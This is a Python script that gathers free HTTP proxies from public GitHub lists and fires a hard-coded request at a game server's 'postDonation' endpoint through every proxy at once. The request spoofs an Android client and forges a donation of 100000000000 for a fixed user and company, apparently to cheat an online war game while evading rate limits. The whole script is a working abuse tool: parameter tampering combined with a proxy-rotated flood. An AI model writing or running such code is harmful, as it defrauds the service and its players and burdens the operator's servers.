import requests
import concurrent.futures
from datetime import datetime

# ================= CONFIG =================
REQUEST_TIMEOUT = 60

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
]

donation_api = (
"http://52.24.104.170:8086/RestSimulator?Operation=postDonation&available_patriotism=1000&company_id=4579286&company_name=G%C3%98M%C3%82ST%C3%84R%F0%9F%91%BD%5BELITE+FOUNDER%5D%0A&country=Germany&donation_sum=100000000000&donation_type=0&sender_company_id=4579286&user_id=C28759C6A78E4E22AC93D78F107E5C72&version_code=23&war_id=57854"
)

headers = {
    "User-Agent": "android-asynchttp://loopj.com/android-async-http"
}

# ==========================================

def fetch_source(url):
    proxies = set()
    try:
        r = requests.get(url, timeout=20)
        for line in r.text.splitlines():
            line = line.strip()

            if not line:
                continue

            if line.startswith("http://"):
                proxies.add(line.replace("http://", ""))
            elif line.startswith("https://"):
                proxies.add(line.replace("https://", ""))
            elif "://" not in line and ":" in line:
                proxies.add(line)

    except Exception as e:
        print(f"[!] Failed {url}: {e}")

    return proxies

def fetch_all_proxies_concurrently():
    all_proxies = set()

    with concurrent.futures.ThreadPoolExecutor(
        max_workers=len(PROXY_SOURCES)
    ) as executor:
        futures = executor.map(fetch_source, PROXY_SOURCES)

    for proxy_set in futures:
        all_proxies.update(proxy_set)

    return list(all_proxies)

def make_request(proxy):
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }

    try:
        r = requests.get(
            donation_api,
            headers=headers,
            proxies=proxy_dict,
            timeout=REQUEST_TIMEOUT
        )
        with open("response_log.txt", "a") as log:
            log.write(f"{datetime.now()} | {proxy} | {r.status_code}\n")

    except Exception as e:
        with open("error_log.txt", "a") as log:
            log.write(f"{datetime.now()} | {proxy} | {e}\n")

def main():
    print("[*] Fetching ALL proxies concurrently...")
    proxies = fetch_all_proxies_concurrently()
    print(f"[✓] Loaded {len(proxies)} HTTP proxies")

    print("[*] Firing ALL proxies at once...")
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=len(proxies)
    ) as executor:
        executor.map(make_request, proxies)

    print("[✓] Done")

if __name__ == "__main__":
    main()